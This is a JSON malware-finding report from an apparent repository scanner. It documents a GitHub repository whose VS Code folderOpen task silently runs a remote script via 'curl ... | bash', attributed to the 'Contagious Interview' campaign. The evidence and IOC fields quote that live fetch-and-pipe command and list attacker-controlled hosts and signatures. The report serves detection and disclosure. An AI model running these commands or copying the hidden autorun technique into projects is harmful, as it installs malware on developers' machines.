@@ -1,0 +1,77 @@
+{
+  "finding": {
+    "key": "repository:addis-ale/git_learn",
+    "kind": "repository",
+    "id": "addis-ale/git_learn",
+    "url": "https://github.com/addis-ale/git_learn",
+    "registry": "github",
+    "owner": "addis-ale",
+    "status": "confirmed",
+    "confidence": "auto",
+    "score": 10,
+    "detection_method": "signature_match",
+    "attribution": "",
+    "campaign_id": "GW-C-498a0aeb",
+    "rules": "install_hook/vscode-autorun; obfuscation/atob",
+    "evidence_locations": ".vscode/tasks.json:0; new.ts:4",
+    "c2_hosts": "default-configuration.vercel.app",
+    "iocs": "default-configuration.vercel.app; https://default-configuration.vercel.app/settings/linux?flag=9-test; curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash; .vscode/tasks.json",
+    "matched_signatures": "settings/linux?flag=; settings/win?flag=",
+    "reasons": "Shares a confirmed-malware code signature ['settings/linux?flag=', 'settings/win?flag='] | Tier-2 confirmed (bash score 9)",
+    "osm_status": "not_submitted",
+    "osm_threat_id": "",
+    "first_seen": "hunt-20261003T093317Z",
+    "last_seen": "hunt-20261003T093317Z",
+    "evidence_file": "repositories/addis-ale_git_learn.json",
+    "reviewer_decision": "",
+    "notes": ""
+  },
+  "evidence": [
+    {
+      "file": ".vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": ".vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "new.ts",
+      "line": 4,
+      "category": "obfuscation",
+      "rule": "atob",
+      "snippet": "const src = atob(process.env.AUTH_API_KEY);"
+    }
+  ],
+  "commit_sha": "c4ef5f059a4f2831707928756dedddcb0094f563",
+  "osm_report": {
+    "report_type": "repository",
+    "resource_identifier": "https://github.com/addis-ale/git_learn",
+    "version_info": "all",
+    "threat_description": "Git Warden confirmed this repository as malicious by static analysis of its source code. The code was read, never executed. The malicious code sits in the file .vscode/tasks.json. The code runs automatically from a Visual Studio Code task configured to trigger on folderOpen. Nothing has to be installed, built, or clicked. Opening the project folder in the editor is enough to run the attacker's command. The task fetches a remote script and pipes it straight into a shell, with a separate payload selected for macOS, Linux and Windows. It also carries a presentation block that sets reveal to never and echo to false and closes the panel afterwards, which hides the terminal so the victim never sees the command run. Suppressing output next to a fetch and pipe has no legitimate use and shows the intent is concealment. No legitimate project ships code like this. The repository was either compromised or purpose-built to deliver malware to anyone who clones or installs it. The evidence references link the exact file and line of each finding, and the payload description names every detection rule that fired, so a reviewer can open the repository and verify each one independently. Git Warden found this repository by searching GitHub for code that matches a confirmed malware signature: settings/linux?flag=; settings/win?flag=. The delivery method, a .vscode/tasks.json task that automatically runs a remote shell command the moment the repository is opened in VS Code, matches the DPRK-attributed 'Contagious Interview' campaign, in which fake recruiters lure developers into opening a coding-task repository that silently executes a first-stage downloader. The payload is fetched from attacker-controlled infrastructure: default-configuration.vercel.app. This repository is one of 34 that Git Warden has confirmed as campaign GW-C-498a0aeb, which all deliver the same dropper URL shape (settings/{os}?flag=). The campaign spans 29 GitHub accounts. The other confirmed repositories are: https://github.com/aaryan121/code-conductor-fork, https://github.com/adan-asim/e-commerce-admin-app-backend, https://github.com/bhoomikamehtastartbit/reactchakraui, https://github.com/dawit212119/eaglepoint-ai, https://github.com/dawit212119/ecommerce-backend, https://github.com/dylanlittle/team-moshpit-project, https://github.com/eastmade/web3project-momo-token, https://github.com/gauravraisharma/ticketting-system, https://github.com/hammad911/datavisualizationproject, https://github.com/haroldcalvo/workshop, https://github.com/huncholane/defi_property, https://github.com/hvmgeeks/frontendengine1, https://github.com/juanmantica123/funtico-tech-assestment, https://github.com/kreliannn/house-rental-platform, https://github.com/kreliannn/musicplayer, https://github.com/kreliannn/pharmacy-management-backend, https://github.com/lfirsl/morphix, https://github.com/luka147m/r-gradani, https://github.com/markomilivojevic/ethvault_staking, https://github.com/modish0161/poo-land-app, https://github.com/modish0161/tiger-world-maze, https://github.com/nelsondev19/defi-property, https://github.com/nurfarazi/e-commerce-mvp, https://github.com/nurfarazi/piece_of_cake_laundry, https://github.com/prahaladbelavadi/coinlocatordemo, https://github.com/ricardomartins9899/smartpay-demo, https://github.com/ru-yaka/p, https://github.com/sharmapranay38/new_age_blockchain, https://github.com/shri33/crypto-trading-platform, https://github.com/sky-cook/tokentradingdapp, and 3 more. Across the campaign the payload is served from 11 distinct hosts: default-configuration-sandy.vercel.app, default-configuration.vercel.app, vscode-bootstrapper.vercel.app, vscode-config-settings.vercel.app, vscode-extension-260120.vercel.ap, vscode-extension-260120.vercel.app, vscode-extensions-bootstrap.vercel.app, vscode-helper-132.vercel.app, vscode-helper171-ruby.vercel.app, vscode-load-config.vercel.app, vscode-settings-bootstrap.vercel.app. Matching only one host would miss most of the operation; matching the delivery shape found all of it. Attribution: we assess this repository as PROBABLE North Korea 'Contagious Interview' activity. The evidence behind this is: (1) Delivery vector matches Contagious-Interview tradecraft: vscode-folderopen-autorun, dprk-dropper-path-shape. (2) Payload host is curated known-DPRK / Contagious-Interview infrastructure: default-configuration.vercel.app.",
+    "payload_description": "The malicious payload sits in .vscode/tasks.json. The code runs automatically from a Visual Studio Code task configured to trigger on folderOpen. Nothing has to be installed, built, or clicked. Opening the project folder in the editor is enough to run the attacker's command. The task fetches a remote script and pipes it straight into a shell, with a separate payload selected for macOS, Linux and Windows. It also carries a presentation block that sets reveal to never and echo to false and closes the panel afterwards, which hides the terminal so the victim never sees the command run. Suppressing output next to a fetch and pipe has no legitimate use and shows the intent is concealment. Detection rules that fired in this repository: install_hook/vscode-autorun (1 file), obfuscation/atob (1 file).",
+    "publisher": "addis-ale",
+    "severity_level": "critical",
+    "tags": [
+      "supply-chain",
+      "github-repo",
+      "contagious-interview",
+      "fake-recruiter",
+      "dprk",
+      "north-korea",
+      "vscode-folderopen-autorun",
+      "dropper"
+    ],
+    "evidence_references": "https://github.com/addis-ale/git_learn/blob/c4ef5f059a4f2831707928756dedddcb0094f563/.vscode/tasks.json\nhttps://github.com/addis-ale/git_learn/blob/c4ef5f059a4f2831707928756dedddcb0094f563/new.ts#L4",
+    "verified_iocs": "default-configuration.vercel.app\nhttps://default-configuration.vercel.app/settings/linux?flag=9-test\ncurl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash\n.vscode/tasks.json",
+    "contributors": [],
+    "first_seen": "2026-10-03T09:33:17Z",
+    "last_seen": "2026-10-03T09:33:17Z"
+  }
+}
